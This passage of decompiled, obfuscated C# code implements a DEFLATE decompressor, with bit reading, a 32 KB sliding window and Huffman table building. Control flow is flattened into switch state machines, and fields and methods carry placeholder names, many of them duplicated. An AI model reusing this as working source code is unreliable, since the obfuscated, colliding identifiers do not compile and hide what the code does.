            if (this.\u003F12\u003F == 0)
            {
              this.\u003F0\u003F = 2;
              num2 = 17;
              continue;
            }
            goto label_31;
          case 17:
            goto label_30;
          case 18:
            this.\u003F5\u003F = this.\u003F0\u003F.\u003F5\u003F();
            num2 = 19;
            continue;
          default:
            goto label_35;
        }
        num6 = this.\u003F0\u003F.\u003F0\u003F(16);
        num2 = 13;
        continue;
label_27:
        num7 = this.\u003F0\u003F.\u003F0\u003F(this.\u003F0\u003F, this.\u003F12\u003F);
        num2 = 15;
      }
label_4:
      return false;
label_17:
      this.\u003F0\u003F = 6;
label_18:
      return true;
label_30:
      return true;
label_31:
      return !this.\u003F0\u003F.\u003F0\u003F();
label_35:
      this.\u003F0\u003F = 7;
label_36:
      return this.\u003F0\u003F();
label_38:
      return false;
label_40:
      return false;
label_41:
      return false;
label_43:
      return false;
label_44:
      return false;
label_45:
      return false;
    }

    public int \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      int num1 = 0;
      do
      {
        if (this.\u003F0\u003F != 11)
          goto label_9;
label_7:
        continue;
label_9:
        int num2 = this.\u003F0\u003F.\u003F0\u003F(_param1, _param2, _param3);
        int num3 = 0;
        while (true)
        {
          switch (num3)
          {
            case 0:
              _param2 += num2;
              num3 = 1;
              continue;
            case 1:
              num1 += num2;
              num3 = 2;
              continue;
            case 2:
              _param3 -= num2;
              num3 = 3;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        if (_param3 != 0)
          goto label_7;
        else
          goto label_10;
      }
      while (this.\u003F5\u003F() || this.\u003F0\u003F.\u003F5\u003F() > 0 && this.\u003F0\u003F != 11);
      return num1;
label_10:
      return num1;
    }
  }

  internal class \u003F5\u003F
  {
    private byte[] \u003F0\u003F;
    private int \u003F0\u003F;
    private int \u003F5\u003F;
    private uint \u003F0\u003F;
    private int \u003F9\u003F;

    public int \u003F0\u003F(int _param1)
    {
      if (this.\u003F9\u003F < _param1)
        goto label_2;
label_1:
      return (int) ((long) this.\u003F0\u003F & (long) ((1 << _param1) - 1));
label_2:
      if (this.\u003F0\u003F == this.\u003F5\u003F)
        return -1;
      this.\u003F0\u003F |= (uint) (((int) this.\u003F0\u003F[this.\u003F0\u003F++] & (int) byte.MaxValue | ((int) this.\u003F0\u003F[this.\u003F0\u003F++] & (int) byte.MaxValue) << 8) << this.\u003F9\u003F);
      this.\u003F9\u003F += 16;
      goto label_1;
    }

    public void \u003F0\u003F(int _param1)
    {
      this.\u003F0\u003F >>= _param1;
      this.\u003F9\u003F -= _param1;
    }

    public int \u003F0\u003F() => this.\u003F9\u003F;

    public int \u003F5\u003F() => this.\u003F5\u003F - this.\u003F0\u003F + (this.\u003F9\u003F >> 3);

    public void \u003F0\u003F()
    {
      this.\u003F0\u003F >>= this.\u003F9\u003F & 7;
      this.\u003F9\u003F &= -8;
    }

    public bool \u003F0\u003F() => this.\u003F0\u003F == this.\u003F5\u003F;

    public int \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      int num1 = 0;
      int num2 = 0;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (this.\u003F9\u003F > 0 && _param3 > 0)
            {
              _param1[_param2++] = (byte) this.\u003F0\u003F;
              num2 = 1;
              continue;
            }
            if (_param3 != 0)
            {
              num3 = this.\u003F5\u003F - this.\u003F0\u003F;
              num2 = 5;
              continue;
            }
            goto label_16;
          case 1:
            this.\u003F0\u003F >>= 8;
            num2 = 2;
            continue;
          case 2:
            this.\u003F9\u003F -= 8;
            num2 = 3;
            continue;
          case 3:
            --_param3;
            num2 = 4;
            continue;
          case 4:
            ++num1;
            goto case 0;
          case 5:
            if (_param3 > num3)
              goto label_17;
label_11:
            Array.Copy((Array) this.\u003F0\u003F, this.\u003F0\u003F, (Array) _param1, _param2, _param3);
            num2 = 6;
            continue;
label_17:
            _param3 = num3;
            goto label_11;
          case 6:
            this.\u003F0\u003F += _param3;
            num2 = 7;
            continue;
          case 7:
            if ((this.\u003F0\u003F - this.\u003F5\u003F & 1) != 0)
            {
              this.\u003F0\u003F = (uint) this.\u003F0\u003F[this.\u003F0\u003F++] & (uint) byte.MaxValue;
              num2 = 8;
              continue;
            }
            goto label_15;
          default:
            goto label_14;
        }
      }
label_14:
      this.\u003F9\u003F = 8;
label_15:
      return num1 + _param3;
label_16:
      return num1;
    }

    public void \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      if (this.\u003F0\u003F >= this.\u003F5\u003F)
      {
        int num1 = _param2 + _param3;
        int num2 = 0;
        while (true)
        {
          switch (num2)
          {
            case 0:
              if (0 <= _param2 && _param2 <= num1 && num1 <= _param1.Length)
              {
                if ((_param3 & 1) != 0)
                {
                  this.\u003F0\u003F |= (uint) (((int) _param1[_param2++] & (int) byte.MaxValue) << this.\u003F9\u003F);
                  num2 = 1;
                  continue;
                }
                break;
              }
              goto label_4;
            case 1:
              this.\u003F9\u003F += 8;
              break;
            case 2:
              this.\u003F0\u003F = _param2;
              num2 = 3;
              continue;
            case 3:
              this.\u003F5\u003F = num1;
              num2 = 4;
              continue;
            default:
              goto label_12;
          }
          this.\u003F0\u003F = _param1;
          num2 = 2;
        }
label_12:
        return;
label_4:
        throw new ArgumentOutOfRangeException();
      }
      throw new InvalidOperationException();
    }
  }

  internal class \u003F9\u003F
  {
    private byte[] \u003F0\u003F = new byte[32768];
    private int \u003F0\u003F;
    private int \u003F5\u003F;

    public void \u003F0\u003F(int _param1)
    {
      int num1 = this.\u003F5\u003F++;
      int num2 = 0;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (num1 != 32768)
            {
              this.\u003F0\u003F[this.\u003F0\u003F++] = (byte) _param1;
              num2 = 1;
              continue;
            }
            goto label_5;
          case 1:
            this.\u003F0\u003F &= (int) short.MaxValue;
            num2 = 2;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return;
label_5:
      throw new InvalidOperationException();
    }

    private void \u003F0\u003F(int _param1, int _param2, int _param3)
    {
      while (_param2-- > 0)
      {
        this.\u003F0\u003F[this.\u003F0\u003F++] = this.\u003F0\u003F[_param1++];
        this.\u003F0\u003F &= (int) short.MaxValue;
        _param1 &= (int) short.MaxValue;
      }
    }

    public void \u003F0\u003F(int _param1, int _param2)
    {
      int num1 = this.\u003F5\u003F += _param1;
      int num2 = 0;
      int sourceIndex;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (num1 <= 32768)
            {
              sourceIndex = this.\u003F0\u003F - _param2 & (int) short.MaxValue;
              num2 = 1;
              continue;
            }
            goto label_12;
          case 1:
            num3 = 32768 - _param1;
            num2 = 2;
            continue;
          case 2:
            if (sourceIndex > num3 || this.\u003F0\u003F >= num3)
            {
              this.\u003F0\u003F(sourceIndex, _param1, _param2);
              num2 = 5;
              continue;
            }
            if (_param1 <= _param2)
            {
              Array.Copy((Array) this.\u003F0\u003F, sourceIndex, (Array) this.\u003F0\u003F, this.\u003F0\u003F, _param1);
              num2 = 3;
              continue;
            }
            goto label_9;
          case 3:
            this.\u003F0\u003F += _param1;
            num2 = 4;
            continue;
          case 4:
            goto label_15;
          default:
            goto label_7;
        }
      }
label_15:
      return;
label_7:
      return;
label_9:
      while (_param1-- > 0)
        this.\u003F0\u003F[this.\u003F0\u003F++] = this.\u003F0\u003F[sourceIndex++];
      return;
label_12:
      throw new InvalidOperationException();
    }

    public int \u003F0\u003F(\u003F24\u003F.\u003F5\u003F _param1, int _param2)
    {
      _param2 = Math.Min(Math.Min(_param2, 32768 - this.\u003F5\u003F), _param1.\u003F5\u003F());
      int num1 = 0;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num2 = 32768 - this.\u003F0\u003F;
            num1 = 1;
            continue;
          case 1:
            if (_param2 <= num2)
            {
              num3 = _param1.\u003F0\u003F(this.\u003F0\u003F, this.\u003F0\u003F, _param2);
              goto case 3;
            }
            else
            {
              num3 = _param1.\u003F0\u003F(this.\u003F0\u003F, this.\u003F0\u003F, num2);
              num1 = 2;
              continue;
            }
          case 2:
            if (num3 == num2)
            {
              num3 += _param1.\u003F0\u003F(this.\u003F0\u003F, 0, _param2 - num2);
              num1 = 3;
              continue;
            }
            goto case 3;
          case 3:
            this.\u003F0\u003F = this.\u003F0\u003F + num3 & (int) short.MaxValue;
            num1 = 4;
            continue;
          case 4:
            this.\u003F5\u003F += num3;
            num1 = 5;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return num3;
    }

    public int \u003F0\u003F() => 32768 - this.\u003F5\u003F;

    public int \u003F5\u003F() => this.\u003F5\u003F;

    public int \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      int num1 = this.\u003F0\u003F;
      int num2 = 0;
      int num3;
      while (true)
      {
        int length;
        switch (num2)
        {
          case 0:
            if (_param3 <= this.\u003F5\u003F)
            {
              num1 = this.\u003F0\u003F - this.\u003F5\u003F + _param3 & (int) short.MaxValue;
              goto case 1;
            }
            else
            {
              _param3 = this.\u003F5\u003F;
              num2 = 1;
              continue;
            }
          case 1:
            num3 = _param3;
            num2 = 2;
            continue;
          case 2:
            length = _param3 - num1;
            num2 = 3;
            continue;
          case 3:
            if (length > 0)
            {
              Array.Copy((Array) this.\u003F0\u003F, 32768 - length, (Array) _param1, _param2, length);
              num2 = 4;
              continue;
            }
            break;
          case 4:
            _param2 += length;
            num2 = 5;
            continue;
          case 5:
            _param3 = num1;
            break;
          case 6:
            this.\u003F5\u003F -= num3;
            num2 = 7;
            continue;
          default:
            goto label_11;
        }
        Array.Copy((Array) this.\u003F0\u003F, num1 - _param3, (Array) _param1, _param2, _param3);
        num2 = 6;
      }
label_11:
      if (this.\u003F5\u003F >= 0)
        return num3;
      throw new InvalidOperationException();
    }
  }

  internal class \u003F11\u003F
  {
    private short[] \u003F0\u003F;
    public static readonly \u003F24\u003F.\u003F11\u003F \u003F0\u003F;
    public static readonly \u003F24\u003F.\u003F11\u003F \u003F5\u003F;

    static \u003F11\u003F()
    {
      byte[] numArray = new byte[288];
      int num1 = 0;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num2 = 0;
            num1 = 1;
            continue;
          case 1:
            while (num2 < 144)
              numArray[num2++] = (byte) 8;
            while (num2 < 256)
              numArray[num2++] = (byte) 9;
            while (num2 < 280)
              numArray[num2++] = (byte) 7;
            while (num2 < 288)
              numArray[num2++] = (byte) 8;
            \u003F24\u003F.\u003F11\u003F.\u003F0\u003F = new \u003F24\u003F.\u003F11\u003F(numArray);
            num1 = 2;
            continue;
          case 2:
            numArray = new byte[32];
            num1 = 3;
            continue;
          case 3:
            num2 = 0;
            num1 = 4;
            continue;
          case 4:
            while (num2 < 32)
              numArray[num2++] = (byte) 5;
            \u003F24\u003F.\u003F11\u003F.\u003F5\u003F = new \u003F24\u003F.\u003F11\u003F(numArray);
            num1 = 5;
            continue;
          default:
            goto label_17;
        }
      }
label_17:;
    }

    public \u003F11\u003F(byte[] _param1) => this.\u003F0\u003F(_param1);

    private void \u003F0\u003F(byte[] _param1)
    {
      int[] numArray1 = new int[16];
      int num1 = 0;
      while (true)
      {
        int[] numArray2;
        int index1;
        int index2;
        int length;
        int index3;
        int num2;
        int num3;
        int num4;
        int num5;
        int index4;
        int num6;
        int num7;
        int num8;
        int index5;
        int index6;
        int index7;
        int num9;
        int num10;
        switch (num1)
        {
          case 0:
            numArray2 = new int[16];
            num1 = 1;
            continue;
          case 1:
            index1 = 0;
            num1 = 2;
            continue;
          case 2:
            if (index1 < _param1.Length)
            {
              index2 = (int) _param1[index1];
              num1 = 3;
              continue;
            }
            num2 = 0;
            num1 = 4;
            continue;
          case 3:
            if (index2 > 0)
              goto label_44;
label_6:
            ++index1;
            goto case 2;
label_44:
            ++numArray1[index2];
            goto label_6;
          case 4:
            length = 512;
            num1 = 5;
            continue;
          case 5:
            index3 = 1;
            num1 = 6;
            continue;
          case 6:
label_16:
            if (index3 <= 15)
            {
              numArray2[index3] = num2;
              num1 = 7;
              continue;
            }
            this.\u003F0\u003F = new short[length];
            num1 = 11;
            continue;
          case 7:
            num2 += numArray1[index3] << 16 - index3;
            num1 = 8;
            continue;
          case 8:
            if (index3 >= 10)
            {
              num3 = numArray2[index3] & 130944;
              num1 = 9;
              continue;
            }
            break;
          case 9:
            num4 = num2 & 130944;
            num1 = 10;
            continue;
          case 10:
            length += num4 - num3 >> 16 - index3;
            break;
          case 11:
            num5 = 512;
            num1 = 12;
            continue;
          case 12:
            index4 = 15;
            num1 = 13;
            continue;
          case 13:
            if (index4 >= 10)
            {
              num6 = num2 & 130944;
              num1 = 14;
              continue;
            }
            index5 = 0;
            num1 = 20;
            continue;
          case 14:
            num2 -= numArray1[index4] << 16 - index4;
            num1 = 15;
            continue;
          case 15:
            num7 = num2 & 130944;
            num1 = 16;
            continue;
          case 16:
            num8 = num7;
            num1 = 17;
            continue;
          case 17:
            if (num8 < num6)
            {
              this.\u003F0\u003F[(int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(num8)] = (short) (-num5 << 4 | index4);
              num1 = 18;
              continue;
            }
            --index4;
            goto case 13;
          case 18:
            num5 += 1 << index4 - 9;
            num1 = 19;
            continue;
          case 19:
            num8 += 128;
            goto case 17;
          case 20:
label_43:
            if (index5 < _param1.Length)
            {
              index6 = (int) _param1[index5];
              num1 = 21;
              continue;
            }
            goto label_51;
          case 21:
            if (index6 != 0)
            {
              num2 = numArray2[index6];
              num1 = 22;
              continue;
            }
            goto label_42;
          case 22:
            index7 = (int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(num2);
            num1 = 23;
            continue;
          case 23:
            if (index6 > 9)
            {
              num9 = (int) this.\u003F0\u003F[index7 & 511];
              num1 = 26;
              continue;
            }
            goto label_32;
          case 24:
            index7 += 1 << index6;
            num1 = 25;
            continue;
          case 25:
            if (index7 < 512)
              goto label_32;
            else
              goto label_41;
          case 26:
            num10 = 1 << (num9 & 15);
            num1 = 27;
            continue;
          case 27:
            num9 = -(num9 >> 4);
            goto label_38;
          case 28:
            index7 += 1 << index6;
            num1 = 29;
            continue;
          default:
            if (index7 < num10)
              goto label_38;
            else
              goto label_41;
        }
        ++index3;
        goto label_16;
label_32:
        this.\u003F0\u003F[index7] = (short) (index5 << 4 | index6);
        num1 = 24;
        continue;
label_38:
        this.\u003F0\u003F[num9 | index7 >> 9] = (short) (index5 << 4 | index6);
        num1 = 28;
        continue;
label_41:
        numArray2[index6] = num2 + (1 << 16 - index6);
label_42:
        ++index5;
        goto label_43;
      }
label_51:;
    }

    public int \u003F0\u003F(\u003F24\u003F.\u003F5\u003F _param1)
    {
      int index1;
      if ((index1 = _param1.\u003F0\u003F(9)) < 0)
        goto label_14;
      else
        goto label_18;
label_1:
      int num1;
      int num2;
      int num3;
      int num4;
      int num5;
      int num6;
      while (true)
      {
        switch (num6)
        {
          case 0:
            goto label_2;
          case 1:
            num3 = num1 & 15;
            num6 = 2;
            continue;
          case 2:
            if ((index1 = _param1.\u003F0\u003F(num3)) < 0)
            {
              num4 = _param1.\u003F0\u003F();
              num6 = 5;
              continue;
            }
            num1 = (int) this.\u003F0\u003F[num2 | index1 >> 9];
            num6 = 3;
            continue;
          case 3:
            _param1.\u003F0\u003F(num1 & 15);
            num6 = 4;
            continue;
          case 4:
            goto label_7;
          case 5:
            index1 = _param1.\u003F0\u003F(num4);
            num6 = 6;
            continue;
          case 6:
            num1 = (int) this.\u003F0\u003F[num2 | index1 >> 9];
            num6 = 7;
            continue;
          case 7:
            if ((num1 & 15) <= num4)
            {
              _param1.\u003F0\u003F(num1 & 15);
              num6 = 8;
              continue;
            }
            goto label_13;
          case 8:
            goto label_12;
          case 9:
            index1 = _param1.\u003F0\u003F(num5);
            num6 = 10;
            continue;
          case 10:
            num1 = (int) this.\u003F0\u003F[index1];
            num6 = 11;
            continue;
          case 11:
            if (num1 >= 0 && (num1 & 15) <= num5)
            {
              _param1.\u003F0\u003F(num1 & 15);
              num6 = 12;
              continue;
            }
            goto label_24;
          default:
            goto label_23;
        }
      }
label_2:
      return num1 >> 4;
label_7:
      return num1 >> 4;
label_12:
      return num1 >> 4;
label_13:
      return -1;
label_23:
      return num1 >> 4;
label_24:
      return -1;
label_14:
      num5 = _param1.\u003F0\u003F();
      num6 = 9;
      goto label_1;
label_18:
      short[] numArray = this.\u003F0\u003F;
      int index2 = index1;
      if ((num1 = (int) numArray[index2]) < 0)
      {
        num2 = -(num1 >> 4);
        num6 = 1;
        goto label_1;
      }
      else
      {
        _param1.\u003F0\u003F(num1 & 15);
        num6 = 0;
        goto label_1;
      }
    }
  }

  internal class \u003F12\u003F
  {
    private static readonly int[] \u003F0\u003F = new int[3]
    {
      3,
      3,
      11
    };
    private static readonly int[] \u003F5\u003F = new int[3]
    {
      2,
      3,
      7
    };
    private byte[] \u003F0\u003F;
    private byte[] \u003F5\u003F;
    private \u003F24\u003F.\u003F11\u003F \u003F0\u003F;
    private int \u003F0\u003F;
    private int \u003F5\u003F;
    private int \u003F9\u003F;
    private int \u003F11\u003F;
    private int \u003F12\u003F;
    private int \u003F13\u003F;
    private byte \u003F0\u003F;
    private int \u003F14\u003F;
    private static readonly int[] \u003F9\u003F = new int[19]
    {
      16,
      17,
      18,
      0,
      8,
      7,
      9,
      6,
      10,
      5,
      11,
      4,
      12,
      3,
      13,
      2,
      14,
      1,
      15
    };

    public bool \u003F0\u003F(\u003F24\u003F.\u003F5\u003F _param1)
    {
label_0:
      int num1 = this.\u003F0\u003F;
      int num2 = 0;
      while (true)
      {
        int num3;
        int num4;
        int num5;
        switch (num2)
        {
          case 0:
            switch (num1)
            {
              case 0:
                this.\u003F5\u003F = _param1.\u003F0\u003F(5);
                num2 = 1;
                continue;
              case 1:
                break;
              case 2:
                goto label_15;
              case 3:
                goto label_27;
              case 4:
                goto label_33;
              case 5:
                goto label_37;
              default:
                goto label_0;
            }
            break;
          case 1:
            if (this.\u003F5\u003F >= 0)
            {
              this.\u003F5\u003F += 257;
              num2 = 2;
              continue;
            }
            goto label_45;
          case 2:
            _param1.\u003F0\u003F(5);
            num2 = 3;
            continue;
          case 3:
            this.\u003F0\u003F = 1;
            break;
          case 4:
            if (this.\u003F9\u003F >= 0)
            {
              ++this.\u003F9\u003F;
              num2 = 5;
              continue;
            }
            goto label_46;
          case 5:
            _param1.\u003F0\u003F(5);
            num2 = 6;
            continue;
          case 6:
            this.\u003F12\u003F = this.\u003F5\u003F + this.\u003F9\u003F;
            num2 = 7;
            continue;
          case 7:
            this.\u003F5\u003F = new byte[this.\u003F12\u003F];
            num2 = 8;
            continue;
          case 8:
            this.\u003F0\u003F = 2;
            goto label_15;
          case 9:
            if (this.\u003F11\u003F >= 0)
            {
              this.\u003F11\u003F += 4;
              num2 = 10;
              continue;
            }
            goto label_47;
          case 10:
            _param1.\u003F0\u003F(4);
            num2 = 11;
            continue;
          case 11:
            this.\u003F0\u003F = new byte[19];
            num2 = 12;
            continue;
          case 12:
            this.\u003F14\u003F = 0;
            num2 = 13;
            continue;
          case 13:
            this.\u003F0\u003F = 3;
            num2 = 14;
            continue;
          case 14:
label_27:
            if (this.\u003F14\u003F < this.\u003F11\u003F)
            {
              num3 = _param1.\u003F0\u003F(3);
              num2 = 15;
              continue;
            }
            this.\u003F0\u003F = new \u003F24\u003F.\u003F11\u003F(this.\u003F0\u003F);
            num2 = 18;
            continue;
          case 15:
            if (num3 >= 0)
            {
              _param1.\u003F0\u003F(3);
              num2 = 16;
              continue;
            }
            goto label_48;
          case 16:
            this.\u003F0\u003F[\u003F24\u003F.\u003F12\u003F.\u003F9\u003F[this.\u003F14\u003F]] = (byte) num3;
            num2 = 17;
            continue;
          case 17:
            ++this.\u003F14\u003F;
            goto case 14;
          case 18:
            this.\u003F0\u003F = (byte[]) null;
            num2 = 19;
            continue;
          case 19:
            this.\u003F14\u003F = 0;
            num2 = 20;
            continue;
          case 20:
            this.\u003F0\u003F = 4;
            num2 = 21;
            continue;
          case 21:
label_33:
            int num6;
            if (((num6 = this.\u003F0\u003F.\u003F0\u003F(_param1)) & -16) == 0)
            {
              this.\u003F5\u003F[this.\u003F14\u003F++] = this.\u003F0\u003F = (byte) num6;
              num2 = 22;
              continue;
            }
            if (num6 >= 0)
            {
              if (num6 >= 17)
                goto label_53;
label_35:
              this.\u003F13\u003F = num6 - 16;
              num2 = 23;
              continue;
label_53:
              this.\u003F0\u003F = (byte) 0;
              goto label_35;
            }
            else
              goto label_52;
          case 22:
            if (this.\u003F14\u003F != this.\u003F12\u003F)
              goto case 21;
            else
              goto label_50;
          case 23:
            this.\u003F0\u003F = 5;
            goto label_37;
          case 24:
            num5 = _param1.\u003F0\u003F(num4);
            num2 = 25;
            continue;
          case 25:
            if (num5 >= 0)
            {
              _param1.\u003F0\u003F(num4);
              num2 = 26;
              continue;
            }
            goto label_54;
          case 26:
            num5 += \u003F24\u003F.\u003F12\u003F.\u003F0\u003F[this.\u003F13\u003F];
            num2 = 27;
            continue;
          case 27:
            while (num5-- > 0)
              this.\u003F5\u003F[this.\u003F14\u003F++] = this.\u003F0\u003F;
            if (this.\u003F14\u003F != this.\u003F12\u003F)
            {
              this.\u003F0\u003F = 4;
              num2 = 28;
              continue;
            }
            goto label_56;
          default:
            goto label_0;
        }
        this.\u003F9\u003F = _param1.\u003F0\u003F(5);
        num2 = 4;
        continue;
label_15:
        this.\u003F11\u003F = _param1.\u003F0\u003F(4);
        num2 = 9;
        continue;
label_37:
        num4 = \u003F24\u003F.\u003F12\u003F.\u003F5\u003F[this.\u003F13\u003F];
        num2 = 24;
      }
label_45:
      return false;
label_46:
      return false;
label_47:
      return false;
label_48:
      return false;
label_50:
      return true;
label_52:
      return false;
label_54:
      return false;
label_56:
      return true;
    }

    public \u003F24\u003F.\u003F11\u003F \u003F0\u003F()
    {
      byte[] destinationArray = new byte[this.\u003F5\u003F];
      Array.Copy((Array) this.\u003F5\u003F, 0, (Array) destinationArray, 0, this.\u003F5\u003F);
      return new \u003F24\u003F.\u003F11\u003F(destinationArray);
    }

    public \u003F24\u003F.\u003F11\u003F \u003F5\u003F()
    {
      byte[] destinationArray = new byte[this.\u003F9\u003F];
      Array.Copy((Array) this.\u003F5\u003F, this.\u003F5\u003F, (Array) destinationArray, 0, this.\u003F9\u003F);
      return new \u003F24\u003F.\u003F11\u003F(destinationArray);
    }
  }

  internal class \u003F13\u003F
  {
    private int \u003F0\u003F = 16;
    private long \u003F0\u003F;
    private \u003F24\u003F.\u003F17\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F15\u003F \u003F0\u003F;

    public \u003F13\u003F()
    {
      this.\u003F0\u003F = new \u003F24\u003F.\u003F17\u003F();
      this.\u003F0\u003F = new \u003F24\u003F.\u003F15\u003F(this.\u003F0\u003F);
    }

    public long \u003F0\u003F() => this.\u003F0\u003F;

    public void \u003F0\u003F() => this.\u003F0\u003F |= 12;

    public bool \u003F0\u003F() => this.\u003F0\u003F == 30 && this.\u003F0\u003F.\u003F0\u003F();

    public bool \u003F5\u003F() => this.\u003F0\u003F.\u003F0\u003F();

    public void \u003F0\u003F(byte[] _param1) => this.\u003F0\u003F.\u003F0\u003F(_param1);

    public int \u003F0\u003F(byte[] _param1)
    {
      int num1 = 0;
      int num2 = 0;
      int length;
      int num3;
      while (true)
      {
        int num4;
        int num5;
        switch (num2)
        {
          case 0:
            length = _param1.Length;
            num2 = 1;
            continue;
          case 1:
            num3 = length;
            break;
          case 2:
            num1 += num4;
            num2 = 3;
            continue;
          case 3:
            this.\u003F0\u003F += (long) num4;
            num2 = 4;
            continue;
          case 4:
            length -= num4;
            num2 = 5;
            continue;
          case 5:
            if (length != 0 && this.\u003F0\u003F != 30)
            {
              if (!this.\u003F0\u003F.\u003F5\u003F((this.\u003F0\u003F & 4) != 0, (this.\u003F0\u003F & 8) != 0))
              {
                if (this.\u003F0\u003F != 16)
                {
                  if (this.\u003F0\u003F != 20)
                  {
                    if (this.\u003F0\u003F == 28)
                    {
                      this.\u003F0\u003F.\u003F0\u003F();
                      num2 = 9;
                      continue;
                    }
                    break;
                  }
                  num5 = 8 + (-this.\u003F0\u003F.\u003F0\u003F() & 7);
                  num2 = 6;
                  continue;
                }
                goto label_17;
              }
              else
                break;
            }
            else
              goto label_21;
          case 6:
            if (num5 > 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(2, 10);
              num2 = 7;
              continue;
            }
            this.\u003F0\u003F = 16;
            num2 = 8;
            continue;
          case 7:
            num5 -= 10;
            goto case 6;
          case 9:
            this.\u003F0\u003F = 30;
            num2 = 10;
            continue;
        }
        num4 = this.\u003F0\u003F.\u003F0\u003F(_param1, num1, length);
        num2 = 2;
      }
label_17:
      return num3 - length;
label_21:
      return num3 - length;
    }
  }

  internal class \u003F14\u003F
  {
    private static readonly int[] \u003F0\u003F = new int[19]
    {
      16,
      17,
      18,
      0,
      8,
      7,
      9,
      6,
      10,
      5,
      11,
      4,
      12,
      3,
      13,
      2,
      14,
      1,
      15
    };
    private static readonly byte[] \u003F0\u003F;
    private \u003F24\u003F.\u003F17\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F14\u003F.\u003F0\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F14\u003F.\u003F0\u003F \u003F5\u003F;
    private \u003F24\u003F.\u003F14\u003F.\u003F0\u003F \u003F9\u003F;
    private short[] \u003F0\u003F;
    private byte[] \u003F5\u003F;
    private int \u003F0\u003F;
    private int \u003F5\u003F;
    private static readonly short[] \u003F5\u003F;
    private static readonly byte[] \u003F9\u003F;
    private static readonly short[] \u003F9\u003F;
    private static readonly byte[] \u003F11\u003F;

    public static short \u003F0\u003F(int _param0) => (short) ((int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F[_param0 & 15] << 12 | (int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F[_param0 >> 4 & 15] << 8 | (int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F[_param0 >> 8 & 15] << 4 | (int) \u003F24\u003F.\u003F14\u003F.\u003F0\u003F[_param0 >> 12]);

    static \u003F14\u003F()
    {
      int num = 0;
      while (true)
      {
        int index;
        switch (num)
        {
          case 0:
            \u003F24\u003F.\u003F14\u003F.\u003F0\u003F = new byte[16]
            {
              (byte) 0,
              (byte) 8,
              (byte) 4,
              (byte) 12,
              (byte) 2,
              (byte) 10,
              (byte) 6,
              (byte) 14,
              (byte) 1,
              (byte) 9,
              (byte) 5,
              (byte) 13,
              (byte) 3,
              (byte) 11,
              (byte) 7,
              (byte) 15
            };
            num = 1;
            continue;
          case 1:
            \u003F24\u003F.\u003F14\u003F.\u003F5\u003F = new short[286];
            num = 2;
            continue;
          case 2:
            \u003F24\u003F.\u003F14\u003F.\u003F9\u003F = new byte[286];
            num = 3;
            continue;
          case 3:
            index = 0;
            num = 4;
            continue;
          case 4:
            if (index < 144)
            {
              \u003F24\u003F.\u003F14\u003F.\u003F5\u003F[index] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(48 + index << 8);
              num = 5;
              continue;
            }
            break;
          case 5:
            \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index++] = (byte) 8;
            goto case 4;
          case 6:
            \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index++] = (byte) 9;
            break;
          case 7:
            \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index++] = (byte) 7;
            goto label_14;
          case 8:
            \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index++] = (byte) 8;
            goto label_17;
          case 9:
            \u003F24\u003F.\u003F14\u003F.\u003F11\u003F = new byte[30];
            num = 10;
            continue;
          case 10:
            index = 0;
            num = 11;
            continue;
          case 11:
            if (index < 30)
            {
              \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(index << 11);
              num = 12;
              continue;
            }
            goto label_25;
          case 12:
            \u003F24\u003F.\u003F14\u003F.\u003F11\u003F[index] = (byte) 5;
            num = 13;
            continue;
          default:
            ++index;
            goto case 11;
        }
        if (index < 256)
        {
          \u003F24\u003F.\u003F14\u003F.\u003F5\u003F[index] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(256 + index << 7);
          num = 6;
          continue;
        }
label_14:
        if (index < 280)
        {
          \u003F24\u003F.\u003F14\u003F.\u003F5\u003F[index] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(index - 256 << 9);
          num = 7;
          continue;
        }
label_17:
        if (index < 286)
        {
          \u003F24\u003F.\u003F14\u003F.\u003F5\u003F[index] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(index - 88 << 8);
          num = 8;
        }
        else
        {
          \u003F24\u003F.\u003F14\u003F.\u003F9\u003F = new short[30];
          num = 9;
        }
      }
label_25:;
    }

    public \u003F14\u003F(\u003F24\u003F.\u003F17\u003F _param1)
    {
      this.\u003F0\u003F = _param1;
      this.\u003F0\u003F = new \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(this, 286, 257, 15);
      this.\u003F5\u003F = new \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(this, 30, 1, 15);
      this.\u003F9\u003F = new \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(this, 19, 4, 7);
      this.\u003F0\u003F = new short[16384];
      this.\u003F5\u003F = new byte[16384];
    }

    public void \u003F0\u003F()
    {
      this.\u003F0\u003F = 0;
      this.\u003F5\u003F = 0;
    }

    private int \u003F0\u003F(int _param1)
    {
      if (_param1 == (int) byte.MaxValue)
        return 285;
      int num = 257;
      for (; _param1 >= 8; _param1 >>= 1)
        num += 4;
      return num + _param1;
    }

    private int \u003F5\u003F(int _param1)
    {
      int num = 0;
      for (; _param1 >= 4; _param1 >>= 1)
        num += 2;
      return num + _param1;
    }

